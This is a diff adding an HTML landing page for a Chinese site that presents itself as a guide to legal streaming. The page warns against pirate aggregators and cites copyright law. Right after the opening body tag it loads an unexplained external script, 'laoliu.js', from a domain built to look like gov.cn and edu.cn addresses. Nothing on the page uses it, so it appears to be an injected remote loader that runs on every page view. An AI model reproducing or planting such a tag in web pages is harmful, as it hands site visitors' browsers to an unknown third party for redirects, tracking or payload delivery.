@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>青年光影指南 | 合规影视导航（非青年影视）</title>
+  <meta name="description" content="青年光影指南（qingnianyingshi-h5）做正版影视导航与片单推荐。非原青年影视、不聚合片源；不提供播源解析/APK/离线缓存/磁力网盘。含正版分类、光影片单与免费站避坑。" />
+  <meta name="author" content="青年光影指南" />
+  <meta name="robots" content="index,follow" />
+  <meta name="theme-color" content="#0A4D62" />
+  <link rel="canonical" href="https://qingnianyingshi-h5.github.io/" />
+
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="青年光影指南" />
+  <meta property="og:title" content="青年光影指南 | 合规影视导航" />
+  <meta property="og:description" content="非青年影视原站，只做正版持权平台导航。" />
+  <meta property="og:url" content="https://qingnianyingshi-h5.github.io/" />
+  <meta property="og:locale" content="zh_CN" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="青年光影指南 | 合规影视导航" />
+  <meta name="twitter:description" content="正版影视导航，拒绝免费聚合。" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "青年光影指南",
+    "url": "https://qingnianyingshi-h5.github.io/",
+    "description": "正版影视片单推荐与持权渠道导航站（非青年影视原站）。",
+    "inLanguage": "zh-CN"
+  }
+  </script>
+
+  <style>
+    :root{
+      --bg:#F0F6FA;
+      --bg2:#E1E8EF;
+      --card:#FFFFFF;
+      --line:#C9D6E0;
+      --ink:#0A2E3F;
+      --ink-light:#2E5A6E;
+      --muted:#6B8A9E;
+      --cyan:#0A4D62;
+      --cyan-light:#1592B0;
+      --orange:#F28C28;
+      --orange-deep:#E06A1B;
+      --white:#FFFFFF;
+      --red:#E5484D;
+      --radius:16px;
+      --maxw:1180px;
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{margin:0;background:var(--bg);color:var(--ink);line-height:1.75;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;-webkit-font-smoothing:antialiased}
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:var(--maxw);margin:0 auto;padding:0 20px}
+
+    header.nav{position:sticky;top:0;z-index:50;background:rgba(240,246,250,.96);backdrop-filter:blur(12px);border-bottom:2px solid var(--cyan-light)}
+    .nav-inner{display:flex;align-items:center;justify-content:space-between;height:66px}
+    .logo{font-weight:900;font-size:21px;display:flex;align-items:center;gap:10px}
+    .logo .pixel{width:26px;height:26px;position:relative;display:grid;grid-template-columns:repeat(4,1fr);gap:1px}
+    .logo .pixel span{background:var(--cyan-light);border-radius:1px}
+    .logo .pixel span:nth-child(1){background:var(--orange)}
+    .logo .pixel span:nth-child(4){background:var(--orange)}
+    .logo .pixel span:nth-child(6){background:var(--orange)}
+    .logo .pixel span:nth-child(7){background:var(--cyan-light)}
+    .logo .pixel span:nth-child(10){background:var(--cyan-light)}
+    .logo .pixel span:nth-child(11){background:var(--orange)}
+    .logo b{color:var(--cyan)}
+    .logo span{color:var(--ink)}
+    nav.menu{display:flex;gap:6px;font-size:14px;font-weight:700;color:var(--muted)}
+    nav.menu a{padding:8px 14px;border-radius:8px;border:2px solid transparent;transition:.2s}
+    nav.menu a:hover{color:var(--ink);border-color:var(--line);background:var(--bg2)}
+    .nav-toggle{display:none;background:none;border:2px solid var(--cyan-light);color:var(--ink);border-radius:8px;padding:5px 10px;font-size:18px;cursor:pointer}
+
+    .hero{padding:74px 0 80px;background:
+      radial-gradient(620px 360px at 82% 8%,rgba(22,146,176,.18),transparent 60%),
+      radial-gradient(420px 240px at 6% 94%,rgba(242,140,40,.15),transparent 60%),
+      linear-gradient(180deg,#E1E8EF,#F0F6FA);position:relative;overflow:hidden}
+    .hero .wrap{position:relative;z-index:1;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+    .pill{display:inline-block;background:var(--cyan-light);color:#E0F7FA;font-size:11px;font-weight:800;padding:5px 16px;border-radius:20px;letter-spacing:1px;text-transform:uppercase;margin-bottom:18px}
+    .disclaim{display:inline-block;margin-left:8px;font-size:11px;font-weight:700;color:var(--red);border:1px dashed var(--red);border-radius:20px;padding:4px 12px;vertical-align:middle}
+    .hero h1{font-size:clamp(30px,5.5vw,50px);line-height:1.1;margin:0 0 14px;font-weight:900}
+    .hero h1 em{font-style:normal;color:var(--orange-deep)}
+    .hero h1 .ink-em{color:var(--cyan)}
+    .hero p.lead{font-size:16px;color:var(--ink-light);max-width:640px;margin:0 0 22px}
+    .hero-tags{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px}
+    .hero-tag{border:2px solid var(--line);border-radius:8px;padding:5px 13px;font-size:13px;font-weight:600;background:var(--card)}
+    .cta{display:flex;gap:12px;flex-wrap:wrap}
+    .btn{padding:13px 26px;border-radius:10px;font-weight:800;font-size:15px;transition:.2s;display:inline-flex;gap:6px;align-items:center;cursor:pointer}
+    .btn-primary{background:var(--cyan-light);color:#fff;border:2px solid var(--cyan-light)}
+    .btn-primary:hover{background:var(--cyan);border-color:var(--cyan)}
+    .btn-ghost{border:2px solid var(--ink);color:var(--ink);background:transparent}
+    .btn-ghost:hover{background:var(--ink);color:var(--bg)}
+
+    /* 像素街头放映 */
+    .pixel-stage{width:300px;height:300px;margin:0 auto;position:relative;background:var(--ink);border-radius:18px;border:3px solid var(--cyan-light);box-shadow:0 16px 40px rgba(10,77,98,.3);overflow:hidden;display:flex;align-items:center;justify-content:center}
+    .pixel-grid{position:absolute;inset:0;background:
+      linear-gradient(90deg,transparent 95%,rgba(22,146,176,.1) 95%),
+      linear-gradient(180deg,transparent 95%,rgba(22,146,176,.1) 95%);
+    background-size:20px 20px}
+    .pixel-character{position:relative;z-index:2;width:120px;height:120px;display:grid;grid-template-columns:repeat(8,1fr);grid-template-rows:repeat(8,1fr);gap:2px}
+    .pixel-character div{background:var(--cyan-light);border-radius:2px}
+    .pixel-character div:nth-child(1){background:var(--orange);grid-column:3;grid-row:2}
+    .pixel-character div:nth-child(2){background:var(--orange);grid-column:4;grid-row:2}
+    .pixel-character div:nth-child(3){background:var(--cyan-light);grid-column:2;grid-row:3}
+    .pixel-character div:nth-child(4){background:var(--cyan-light);grid-column:5;grid-row:3}
+    .pixel-character div:nth-child(5){background:var(--cyan-light);grid-column:3;grid-row:4}
+    .pixel-character div:nth-child(6){background:var(--cyan-light);grid-column:4;grid-row:4}
+    .pixel-character div:nth-child(7){background:var(--cyan-light);grid-column:2;grid-row:5}
+    .pixel-character div:nth-child(8){background:var(--cyan-light);grid-column:5;grid-row:5}
+    .pixel-character div:nth-child(9){background:var(--orange);grid-column:3;grid-row:6}
+    .pixel-character div:nth-child(10){background:var(--orange);grid-column:4;grid-row:6}
+    .pixel-character div:nth-child(11){background:var(--cyan-light);grid-column:2;grid-row:7}
+    .pixel-character div:nth-child(12){background:var(--cyan-light);grid-column:5;grid-row:7}
+    .pixel-label{position:absolute;bottom:18px;font-size:11px;letter-spacing:3px;color:var(--orange);font-weight:800;z-index:2}
+
+    section{padding:60px 0;border-bottom:2px dashed var(--line)}
+    .sec-head{margin-bottom:32px;text-align:center}
+    .sec-head .kicker{color:var(--cyan-light);font-weight:800;letter-spacing:2px;text-transform:uppercase;font-size:11px}
+    .sec-head h2{font-size:clamp(24px,4vw,34px);margin:6px 0 8px;font-weight:900}
+    .sec-head p{color:var(--muted);margin:0 auto;max-width:700px;font-size:14px}
+
+    .why{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+    .why-card{background:var(--card);border:2px solid var(--line);border-radius:16px;padding:24px}
+    .why-card.bad{border-left:6px solid var(--red)}
+    .why-card.good{border-left:6px solid var(--cyan-light)}
+    .why-card h3{margin:0 0 12px;font-size:17px;font-weight:800;display:flex;align-items:center;gap:8px}
+    .why-card ul{margin:0;padding-left:18px;color:var(--ink-light);font-size:13px}
+    .why-card ul li{margin:6px 0}
+
+    .cats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .cat{background:var(--card);border:2px solid var(--line);border-radius:14px;padding:22px;text-align:center;transition:.3s}
+    .cat:hover{transform:translateY(-4px);box-shadow:0 10px 26px rgba(10,77,98,.15);border-color:var(--cyan-light)}
+    .cat .ic{font-size:34px;display:block;margin-bottom:10px}
+    .cat h3{margin:0 0 6px;font-size:15px;font-weight:800}
+    .cat p{margin:0;color:var(--muted);font-size:12px}
+
+    .grid-list{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+    .film{background:var(--card);border:2px solid var(--line);border-radius:16px;padding:22px;transition:.3s;position:relative;overflow:hidden}
+    .film::before{content:'';position:absolute;top:0;left:0;width:100%;height:4px;background:linear-gradient(90deg,var(--cyan-light),var(--orange))}
+    .film:hover{transform:translateY(-4px);box-shadow:0 10px 26px rgba(10,77,98,.15)}
+    .film .ic{font-size:32px;display:block;margin-bottom:8px}
+    .film h3{margin:0 0 4px;font-size:16px;font-weight:900}
+    .film .sub{font-size:11px;color:var(--cyan-light);font-weight:700;margin-bottom:6px}
+    .film p{margin:0;color:var(--ink-light);font-size:13px}
+    .film ul{margin:10px 0 0;padding-left:18px;color:var(--muted);font-size:12px}
+    .film ul li{margin:2px 0}
+
+    .src{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .src-card{background:var(--card);border:2px solid var(--line);border-radius:14px;padding:22px;text-align:center;transition:.3s}
+    .src-card:hover{border-color:var(--cyan-light);background:var(--bg2)}
+    .src-card .ic{font-size:32px;margin-bottom:8px;display:block}
+    .src-card h3{margin:0 0 4px;font-size:15px;font-weight:800}
+    .src-card p{margin:0;color:var(--muted);font-size:12px}
+
+    .warn{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .reef{background:var(--card);border:2px solid var(--line);border-radius:12px;padding:22px;border-top:5px solid var(--red)}
+    .reef:nth-child(2){border-top-color:var(--cyan-light)}
+    .reef:nth-child(3){border-top-color:var(--orange)}
+    .reef h3{margin:0 0 8px;font-size:16px;font-weight:800}
+    .reef p{margin:0;color:var(--ink-light);font-size:13px}
+
+    .legal-box{background:var(--card);border:2px solid var(--line);border-radius:16px;padding:32px;max-width:920px;margin:0 auto}
+    .legal-box h3{color:var(--ink);font-size:17px;font-weight:800;margin:24px 0 10px;display:flex;align-items:center;gap:8px}
+    .legal-box h3:first-child{margin-top:0}
+    .legal-box p{color:var(--ink-light);font-size:14px;line-height:1.85;margin:0}
+    .legal-box b{color:var(--red)}
+    .legal-box .cite{background:var(--bg2);border-left:4px solid var(--cyan-light);padding:12px 16px;margin:12px 0;border-radius:0 8px 8px 0;font-size:13px;color:var(--ink);font-style:italic}
+
+    .notice{background:var(--bg2);border:2px dashed var(--red);border-radius:12px;padding:14px 18px;font-size:13px;color:var(--ink-light);max-width:860px;margin:24px auto 0}
+    .notice b{color:var(--red)}
+
+    footer{padding:36px 0;text-align:center;color:var(--muted);font-size:13px;background:#E1E8EF}
+    footer a{color:var(--cyan-light)}
+
+    #toTop{position:fixed;right:16px;bottom:16px;z-index:60;width:46px;height:46px;border-radius:50%;border:2px solid var(--cyan-light);background:var(--cyan-light);color:#fff;font-size:20px;font-weight:900;cursor:pointer;opacity:0;pointer-events:none;transition:.25s}
+    #toTop.show{opacity:1;pointer-events:auto}
+    .reveal{opacity:0;transform:translateY(16px);transition:.5s ease}
+    .reveal.in{opacity:1;transform:none}
+
+    @media (max-width:980px){
+      .hero .wrap{grid-template-columns:1fr}
+      .why{grid-template-columns:1fr}
+      .cats{grid-template-columns:1fr 1fr}
+      .grid-list{grid-template-columns:1fr}
+      .src{grid-template-columns:1fr 1fr}
+      .warn{grid-template-columns:1fr}
+    }
+    @media (max-width:640px){
+      .nav-toggle{display:block}
+      nav.menu{position:absolute;top:66px;left:0;right:0;flex-direction:column;gap:0;padding:10px 20px 20px;background:rgba(240,246,250,.98);border-bottom:2px solid var(--cyan-light);display:none}
+      nav.menu.open{display:flex}
+      nav.menu a{padding:12px 8px;border-bottom:2px solid var(--line);border-radius:0}
+      .cats{grid-template-columns:1fr}
+      .src{grid-template-columns:1fr}
+      .pixel-stage{width:260px;height:260px}
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <div class="logo"><span class="pixel"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span><b>青年</b><span>光影指南</span></div>
+      <button class="nav-toggle" aria-label="菜单" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+      <nav class="menu" id="menu">
+        <a href="#home">首页</a>
+        <a href="#why">为什么选正版</a>
+        <a href="#cats">正版分类导航</a>
+        <a href="#list">光影片单</a>
+        <a href="#src">正版信源</a>
+        <a href="#warn">免费站避坑</a>
+        <a href="#legal">版权合规说明</a>
+      </nav>
+    </div>
+  </header>
+
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div>
+        <div class="pill">Pixel · Legal Only<span class="disclaim">非青年影视</span></div>
+        <h1>青年光影指南<br/>潮玩像素<em>只映正典</em><span class="ink-em">不染盗链</span></h1>
+        <p class="lead">本站不是「青年影视」原站、不重建镜像、不聚合片源、不提供播源解析/APK下载/离线缓存/磁力网盘。青年向影视内容应通过正版持权平台观看，拒绝免费聚合陷阱。</p>
+        <div class="hero-tags">
+          <span class="hero-tag">正版导航</span>
+          <span class="hero-tag">非原青年影视</span>
+          <span class="hero-tag">无播源解析</span>
+          <span class="hero-tag">潮玩像素风</span>
+          <span class="hero-tag">青年向片单</span>
+        </div>
+        <div class="cta">
+          <a class="btn btn-primary" href="#cats">正版分类导航 →</a>
+          <a class="btn btn-ghost" href="#warn">看免费站套路</a>
+        </div>
+      </div>
+      <div>
+        <div class="pixel-stage">
+          <div class="pixel-grid"></div>
+          <div class="pixel-character">
+            <div></div><div></div><div></div><div></div>
+            <div></div><div></div><div></div><div></div>
+            <div></div><div></div><div></div><div></div>
+          </div>
+          <div class="pixel-label">街头放映</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="why" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Why Choose Legal</div>
+        <h2>为什么选正版</h2>
+        <p>青年观影的正确打开方式。</p>
+      </div>
+      <div class="why">
+        <div class="why-card bad">
+          <h3>🚫 免费站风险</h3>
+          <ul>
+            <li>盗版片源画质压缩、水印遮挡</li>
+            <li>弹窗广告、恶意脚本、钓鱼风险</li>
+            <li>无授权传播侵犯创作者权益</li>
+            <li>诱导下载不明播放器/APP</li>
+          </ul>
+        </div>
+        <div class="why-card good">
+          <h3>✅ 正版优势</h3>
+          <ul>
+            <li>高清画质、官方字幕、完整内容</li>
+            <li>安全可靠、无恶意广告</li>
+            <li>支持创作者，促进优质内容生产</li>
+            <li>多终端同步、离线观看等正规功能</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="cats" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Category Nav</div>
+        <h2>正版分类导航</h2>
+        <p>四个入口，按青年兴趣跳正版渠道。</p>
+      </div>
+      <div class="cats">
+        <div class="cat"><span class="ic">🎬</span><h3>独立电影</h3><p>正版点播/影展</p></div>
+        <div class="cat"><span class="ic">📺</span><h3>青春剧集</h3><p>持牌平台订阅</p></div>
+        <div class="cat"><span class="ic">🎨</span><h3>创意短片</h3><p>官方授权频道</p></div>
+        <div class="cat"><span class="ic">🎤</span><h3>音乐纪录片</h3><p>展映/数字修复版</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="list" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Pixel Reel List</div>
+        <h2>光影片单</h2>
+        <p>只列类型与正版路径，不挂播源。</p>
+      </div>
+      <div class="grid-list">
+        <div class="film">
+          <span class="ic">🎬</span>
+          <h3>独立电影</h3>
+          <div class="sub">文艺 · 正版点播</div>
+          <p>青年导演作品、小众文艺片。</p>
+          <ul>
+            <li>正规票务平台购票</li>
+            <li>持权OTT单片租看</li>
+            <li>不装第三方播放器</li>
+          </ul>
+        </div>
+        <div class="film">
+          <span class="ic">📺</span>
+          <h3>青春剧集</h3>
+          <div class="sub">连续剧 · 正版订阅</div>
+          <p>校园、职场、成长题材剧集。</p>
+          <ul>
+            <li>正版平台剧集专区</li>
+            <li>官方会员订阅</li>
+            <li>不搜「青年同款源」</li>
+          </ul>
+        </div>
+        <div class="film">
+          <span class="ic">🎨</span>
+          <h3>创意短片</h3>
+          <div class="sub">短片 · 官方授权</div>
+          <p>实验动画、微电影、创意视频。</p>
+          <ul>
+            <li>官方创意频道</li>
+            <li>认准授权片源</li>
+            <li>不点假播放键</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="src" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Legal Sources</div>
+        <h2>正版信源</h2>
+        <p>只走持权分发，不碰播放器聚合。</p>
+      </div>
+      <div class="src">
+        <div class="src-card"><span class="ic">🎟️</span><h3>院线票务</h3><p>正规购票平台</p></div>
+        <div class="src-card"><span class="ic">📺</span><h3>正版OTT</h3><p>持牌平台订阅/租赁</p></div>
+        <div class="src-card"><span class="ic">🏛️</span><h3>官方频道</h3><p>电视台/制作方发行</p></div>
+        <div class="src-card"><span class="ic">🛒</span><h3>数字商城</h3><p>正版购买/碟片</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="warn" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Fake Free Site</div>
+        <h2>免费站避坑</h2>
+        <p>青年常遇到的影视陷阱。</p>
+      </div>
+      <div class="warn">
+        <div class="reef">
+          <h3>🚫 盗版资源站</h3>
+          <p>标榜"免费高清"的站点，实际提供未授权片源，画质差且法律风险高。</p>
+        </div>
+        <div class="reef">
+          <h3>🚫 解析聚合</h3>
+          <p>通过破解正版接口实现"免费看"，属于深度链接侵权，随时可能失效。</p>
+        </div>
+        <div class="reef">
+          <h3>🚫 诱导下载</h3>
+          <p>要求安装专用播放器、解码器或APK，可能携带恶意软件或窃取隐私。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="legal" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Copyright Compliance</div>
+        <h2>版权合规说明</h2>
+        <p>尊重创作，从正版观影开始。</p>
+      </div>
+      <div class="legal-box">
+        <h3>🎬 关于「青年影视」原形态</h3>
+        <p>「青年影视」类站点多为免费索引/聚合形态，无清晰可核主体，原站形态按通用免费索引信号处理：片源索引、多线路切换、弹窗诱导下载、授权不透明。 本页不对其运营主体作司法侵权定性，只提示风险信号。</p>
+
+        <h3>📜 法律依据</h3>
+        <p>《著作权法》第十条：著作权人享有信息网络传播权，即以有线或者无线方式向公众提供作品，使公众可以在其个人选定的时间和地点获得作品的权利。 未经许可通过信息网络提供影视作品即构成侵权。</p>
+        <div class="cite">《互联网视听节目服务管理规定》第十七条：未持有《许可证》的单位不得为个人提供上载传播视听节目服务。</div>
+
+        <h3>🛡️ 本指南立场</h3>
+        <p>「青年光影指南」严正声明：非原青年影视、无隶属关系；不提供、不推荐、不链接任何播源解析、APK下载、离线缓存、磁力网盘服务。所有片单仅指向正版持权平台的正规订阅/租赁/购票渠道。</p>
+      </div>
+    </div>
+  </section>
+
+  <div class="notice">
+    <b>声明：</b>本页「青年光影指南」仅为"青年"字面的潮玩像素导航壳，非「青年影视」原站/镜像、不聚合片源；不提供播源解析/APK下载/离线缓存/磁力/网盘码；按《著作权法》及网络视听节目管理规定要求，不转播、链接、聚合、集成非法视听节目。原站形态参照公开免费聚合站通用风险信号，不作具体主体司法定性。
+  </div>
+
+  <footer>
+    <div class="wrap">
+      © 2026 青年光影指南（qingnianyingshi-h5）｜ 静态展示站点 ｜
+      内页链接以 <a href="#">#</a> 占位 ｜
+      网站网址：https://qingnianyingshi-h5.github.io ｜
+      非青年影视原站｜不提供播源解析、APK、盗版资源、磁力。
+    </div>
+  </footer>
+
+  <button id="toTop" aria-label="回到顶部" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    document.querySelectorAll('#menu a').forEach(function(a){
+      a.addEventListener('click',function(){ document.getElementById('menu').classList.remove('open'); });
+    });
+    var toTop=document.getElementById('toTop');
+    window.addEventListener('scroll',function(){ toTop.classList.toggle('show',window.scrollY>400); });
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target);} });
+    },{threshold:0.1});
+    document.querySelectorAll('.reveal').forEach(function(el){ io.observe(el); });
+  </script>
+</body>
+</html>
